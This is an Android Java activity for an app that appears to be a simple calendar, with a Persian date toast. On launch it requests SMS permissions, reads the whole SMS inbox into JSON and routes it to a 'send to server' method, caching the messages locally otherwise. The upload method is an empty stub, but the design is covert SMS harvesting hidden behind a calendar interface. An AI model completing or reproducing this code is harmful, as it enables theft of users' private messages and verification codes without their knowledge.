package com.example.myapplication;

import android.content.ContentResolver;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.CalendarView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import android.Manifest;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;



public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_SMS_PERMISSION = 1;
    private RecyclerView recyclerView;
    private SmsAdapter adapter;
    private CalendarView calendarView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, REQUEST_SMS_PERMISSION);
        } else {
            startSmsService();
        }

        calendarView = findViewById(R.id.calendarView);
        recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        calendarView.setOnDateChangeListener((view, year, month, dayOfMonth) -> {
            String selectedDate = dayOfMonth + "/" + (month + 1) + "/" + year;
            Toast.makeText(this, "تاریخ انتخابی: " + selectedDate, Toast.LENGTH_SHORT).show();
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_SMS_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startSmsService();
            } else {
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void startSmsService() {
        if (isServiceRunning()) {
            return;
        }

        JSONArray messages = getMessagesFromService();

        // ارسال پیام‌ها به سرور
        if (isNetworkAvailable()) {
            sendMessagesToServer(messages);
        } else {
            saveMessagesLocally(messages);
        }

    }

    private boolean isServiceRunning() {
        return false;
    }

    private boolean isNetworkAvailable() {
        return true;
    }

    private JSONArray getMessagesFromService() {
        JSONArray messages = new JSONArray();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            int senderIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int timestampIndex = cursor.getColumnIndex("date");

            if (senderIndex != -1 && bodyIndex != -1 && timestampIndex != -1) {
                do {
                    JSONObject messageObject = new JSONObject();
                    String sender = cursor.getString(senderIndex);
                    String body = cursor.getString(bodyIndex);
                    long timestamp = cursor.getLong(timestampIndex);

                    try {
                        messageObject.put("sender", sender);
                        messageObject.put("body", body);
                        messageObject.put("timestamp", timestamp);
                        messages.put(messageObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
        }

        return messages;
    }

    private void sendMessagesToServer(JSONArray messages) {

    }

    private void saveMessagesLocally(JSONArray messages) {
        SharedPreferences sharedPreferences = getSharedPreferences("SmsData", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("messages", messages.toString());
        editor.apply();
    }

    private JSONArray loadMessagesLocally() {
        SharedPreferences sharedPreferences = getSharedPreferences("SmsData", MODE_PRIVATE);
        String messagesString = sharedPreferences.getString("messages", "[]");
        try {
            return new JSONArray(messagesString);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return new JSONArray();
    }

    private void updateRecyclerView(JSONArray messages) {
    }
}
